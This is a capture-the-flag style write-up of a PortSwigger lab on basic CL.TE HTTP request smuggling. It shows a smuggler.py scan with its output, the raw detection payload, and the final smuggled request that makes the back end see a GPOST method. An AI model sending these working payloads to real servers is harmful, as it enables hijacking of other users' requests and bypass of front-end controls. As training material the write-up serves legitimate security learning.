# [Lab: HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)

## Lab

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST.`

## Detect CL.TE

- smuggler.py:

```bash
┌──(kali㉿kali)-[~/Documents/tools]
└─$ python smuggler/smuggler.py -u https://0a9100fd04b3a953c1fd085f00a80097.web-security-academy.net/

  ______                         _                                                                                                                                                                                                         
 / _____)                       | |                                                                                                                                                                                                        
( (____  ____  _   _  ____  ____| | _____  ____                                                                                                                                                                                            
 \____ \|    \| | | |/ _  |/ _  | || ___ |/ ___)                                                                                                                                                                                           
 _____) ) | | | |_| ( (_| ( (_| | || ____| |                                                                                                                                                                                               
(______/|_|_|_|____/ \___ |\___ |\_)_____)_|                                                                                                                                                                                               
                    (_____(_____|                                                                                                                                                                                                          
                                                                                                                                                                                                                                           
     @defparam                         v1.1                                                                                                                                                                                                
                                                                                                                                                                                                                                           
[+] URL        : https://0a9100fd04b3a953c1fd085f00a80097.web-security-academy.net/
[+] Method     : POST
[+] Endpoint   : /
[+] Configfile : default.py
[+] Timeout    : 5.0 seconds
[+] Cookies    : 1 (Appending to the attack)
[nameprefix1]  : OK (TECL: 0.90 - 200) (CLTE: 0.96 - 200)                                           
[tabprefix1]   : Potential CLTE Issue Found - POST @ https://0a9100fd04b3a953c1fd085f00a80097.web-security-academy.net/ - default.py                                                                                                       
[CRITICAL]     : CLTE Payload: /home/kali/Documents/tools/smuggler/payloads/https_0a9100fd04b3a953c1fd085f00a80097_web-security-academy_net_CLTE_tabprefix1.txt URL: https://0a9100fd04b3a953c1fd085f00a80097.web-security-academy.net/

┌──(kali㉿kali)-[~/Documents/tools]
└─$ cat -A /home/kali/Documents/tools/smuggler/payloads/https_0a9100fd04b3a953c1fd085f00a80097_web-security-academy_net_CLTE_tabprefix1.txt   
POST /?cb=3129548901991752 HTTP/1.1^M$
Transfer-Encoding:^Ichunked^M$
Host: 0a9100fd04b3a953c1fd085f00a80097.web-security-academy.net^M$
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36^M$
Content-type: application/x-www-form-urlencoded; charset=UTF-8^M$
Content-Length: 4^M$
Cookie:  session=3ivuxocrmoimvgwds4dokbbkrmhsfqtk;^M$
^M$
1^M$
Z^M$
0^M$
^M$
```

- burpsuite `HTTP request smuggler` extension:

![detect.png](./../img/lab-1-extension-detect.png)

## Solution

```http
POST /post/comment HTTP/1.1^M$
Content-Length: 6^M$
Transfer-Encoding: chunked^M$
^M$
0^M$
^M$
G
```

backend:

  ```http
  POST /post/comment HTTP/1.1^M$
  Content-Length: 6^M$
  Transfer-Encoding: chunked^M$
  ^M$
  0^M$
  ^M$
  ```

  ```http
  G
  ```
